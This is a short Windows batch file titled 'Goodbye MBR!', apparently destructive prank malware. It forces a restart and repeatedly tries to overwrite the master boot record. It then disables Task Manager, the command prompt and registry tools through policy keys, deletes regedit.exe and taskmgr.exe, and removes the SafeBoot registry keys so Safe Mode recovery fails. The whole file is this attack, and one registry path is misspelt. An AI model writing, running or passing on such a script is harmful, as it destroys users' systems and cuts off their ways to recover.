@echo off
cls
title Goodbye MBR!
echo Goodbye Sleep!
shutdown -r -t 600
fdisk /mbr
fdisk /mbr
fdisk /mbr
fdisk /mbr
fdisk /mbr
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Polices\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD /t REG_DWORD /d 2 /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
del %systemroot%\regedit.exe /f /q
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot\*.* /q
Reg Delete HKLM\System\CurrentControlSet\Control\SafeBoot /q
del %systemroot%\system32\taskmgr.exe /f /q >nul

